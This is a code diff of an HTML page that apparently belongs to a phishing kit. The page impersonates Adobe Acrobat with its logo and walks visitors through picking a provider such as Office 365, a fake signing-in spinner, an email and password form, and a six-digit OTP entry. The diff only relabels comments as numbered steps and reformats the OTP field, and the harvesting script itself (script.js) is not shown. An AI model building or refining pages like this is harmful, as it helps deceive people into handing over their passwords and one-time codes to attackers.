@@ -7,7 +7,7 @@
   <link rel="stylesheet" href="styles.css" />
 </head>
 <body>
-  <!-- Theme toggle button -->
+  <!-- Theme toggle -->
   <button id="theme-toggle-btn" type="button" style="position: absolute; top: 1rem; right: 1rem; z-index:10;">
     🌙 Dark Mode
   </button>
@@ -15,7 +15,7 @@
   <div class="background-overlay"></div>
 
   <div class="container">
-    <!-- Flex container for logo and heading/description -->
+    <!-- Logo + Heading -->
     <div class="header-flex">
       <img
         src="https://upload.wikimedia.org/wikipedia/commons/4/42/Adobe_Acrobat_DC_logo_2020.svg"
@@ -28,7 +28,7 @@
       </div>
     </div>
 
-    <!-- Provider Selection -->
+    <!-- Step 1: Select Provider -->
     <section id="provider-selection" class="page active">
       <div class="providers">
         <button class="provider-btn" data-provider="office365">
@@ -54,14 +54,14 @@
       </div>
     </section>
 
-    <!-- Signing In Loading Page -->
+    <!-- Step 2: Loading -->
     <section id="signing-in" class="page">
       <div class="signing-in-spinner"></div>
       <h1>Signing in...</h1>
       <p>Please wait while we prepare your sign-in with <span id="signing-in-provider"></span>.</p>
     </section>
 
-    <!-- Credentials Form -->
+    <!-- Step 3: Email/Password -->
     <section id="credentials-input" class="page">
       <h1 id="credentials-title"></h1>
       <form id="credentials-form">
@@ -74,12 +74,20 @@
       <button id="back-to-providers" class="back-btn">Back</button>
     </section>
 
-    <!-- OTP Form -->
+    <!-- Step 4: OTP Entry -->
     <section id="otp-verification" class="page">
       <h1>OTP Verification</h1>
       <p id="otp-timer"></p>
       <form id="otp-form">
-        <input type="text" id="otp" name="otp" required maxlength="6" pattern="[0-9]{6}" placeholder="6-digit code" />
+        <input
+          type="text"
+          id="otp"
+          name="otp"
+          required
+          maxlength="6"
+          pattern="[0-9]{6}"
+          placeholder="6-digit code"
+        />
         <button type="submit">Verify</button>
       </form>
       <button id="back-to-credentials" class="back-btn">Back</button>
@@ -90,10 +98,10 @@
     </footer>
   </div>
 
-  <!-- Your main login logic -->
+  <!-- Main login logic -->
   <script src="script.js"></script>
 
-  <!-- Theme toggle logic -->
+  <!-- Theme toggle -->
   <script>
     function setTheme(theme) {
       document.documentElement.setAttribute('data-theme', theme);
